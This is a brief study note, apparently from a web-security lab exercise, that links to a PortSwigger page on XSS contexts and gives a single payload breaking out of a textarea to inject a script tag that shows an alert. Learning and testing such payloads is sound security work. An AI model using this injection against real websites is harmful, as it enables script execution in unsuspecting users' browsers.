# XSS 4

[XSS Contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)

Break out of the textarea and inject the script:

```html
</textarea><script>alert("PWNED");</script>
```
